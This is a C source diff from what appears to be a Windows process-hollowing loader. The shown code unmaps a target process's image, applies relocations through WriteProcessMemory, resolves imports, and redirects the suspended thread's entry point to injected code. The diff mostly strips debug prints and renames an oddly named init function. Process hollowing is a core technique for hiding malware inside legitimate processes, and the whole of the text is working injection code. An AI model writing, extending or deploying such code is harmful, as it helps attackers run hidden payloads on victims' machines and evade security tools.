@@ -236,7 +236,6 @@ extern void rellocate(HANDLE proc, void *remoteImageBase, void *heapBase, void *
     BYTE *_block = (BYTE *)((BYTE *)heapBase + (unsigned int)(sec->PointerToRawData));
 
     unsigned int secSz = sec->SizeOfRawData;
-    printf(".reloc ---- %i\n", secSz);
 
     long long delta = (long long)(uintptr_t)remoteImageBase - (long long)(uintptr_t)preferedBase;
     unsigned int parsedBytes = 0;
@@ -249,12 +248,9 @@ extern void rellocate(HANDLE proc, void *remoteImageBase, void *heapBase, void *
             break;
         unsigned int pageRva = block->VirtualAddress;
 
-        printf("block size: %i\n", blockSz);
         uintptr_t page = (uintptr_t)((unsigned long long)remoteImageBase + pageRva);
-        printf("relocation process for page: %llu\n", page);
 
         unsigned int entriesCount = (blockSz - 8) / 2;
-        printf("entreis count: %i\n", entriesCount);
 
         WORD *entry = (WORD *)((BYTE *)block + 8);
 
@@ -274,7 +270,6 @@ extern void rellocate(HANDLE proc, void *remoteImageBase, void *heapBase, void *
                 }
 
                 uintptr_t relocated = oldValue + delta;
-                printf("before relocation: %p ---- after relocation: %p\n", (void *)oldValue, (void *)relocated);
 
                 if (!WriteProcessMemory(proc, (void *)absolute, &relocated, sizeof(relocated), NULL))
                 {
@@ -292,7 +287,6 @@ extern void rellocate(HANDLE proc, void *remoteImageBase, void *heapBase, void *
                 }
 
                 DWORD relocated = (DWORD)((uintptr_t)oldValue + delta);
-                printf("before relocation: %p ---- after relocation: %p\n", (void *)(uintptr_t)oldValue, (void *)(uintptr_t)relocated);
 
                 if (!WriteProcessMemory(proc, (void *)absolute, &relocated, sizeof(relocated), NULL))
                 {
@@ -442,13 +436,15 @@ void _adj_CPU_REGISTERS_(HANDLE thread, DWORD rip)
         printf("[-] 293!\n");
 }
 
+void __ldr__alt_init__()
+{
+}
+
 bool hallowAndStart(HANDLE proc, HANDLE thread, BYTE *pe)
 {
-    HANDLE self = GetCurrentProcess();
     HMODULE ntdll = GetModuleHandleA("ntdll");
     T_NtQueryInformationProcess NtQueryInformationProcess = (T_NtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
     T_NtUnmapViewOfSection NtUnmapViewOfSection = (T_NtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
-    T_NtCreateSection NtCreateSection = (T_NtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
 
     PROCESS_BASIC_INFORMATION self_pinfo;
     unsigned long sz = sizeof(self_pinfo);
@@ -538,15 +534,13 @@ bool hallowAndStart(HANDLE proc, HANDLE thread, BYTE *pe)
     loadedDlls->exportDirBase = extractImageExportTableBase(proc, (BYTE *)ntdll);
 
     resolveIAT(proc, pinfo, remoteV, &loadedDlls, &count, "Main PE");
-
     dumpLoadedDlls(loadedDlls, &count);
+    __ldr__alt_init__();
 
-    uintptr_t entryPont = (uintptr_t)(remoteV + mm.RVAAddressOfEntryPoint);
+    uintptr_t entryPont = (uintptr_t)((__uint64_t)remoteV + mm.RVAAddressOfEntryPoint);
 
     printf("address of entry point is: %p\n", (void *)entryPont);
-    printf("address of entry point is: %llu\n", entryPont);
-
-    printf("ENTRY POINT: %llu\n", entryPont);
+    // does it really change execution flow?
     _adj_CPU_REGISTERS_(thread, (DWORD)entryPont);
 
     printf("PRESS ENT TO RESUME THREAD!\n");
@@ -573,14 +567,10 @@ bool __0x1FN3C3SS4RY__()
         return true;
     exit(1);
 }
-extern bool initializeTetrix()
-{
-    return __0x1FN3C3SS4RY__();
-}
 
 int main()
 {
-    initializeTetrix();
+    __0x1FN3C3SS4RY__();
     return 0;
 }
 
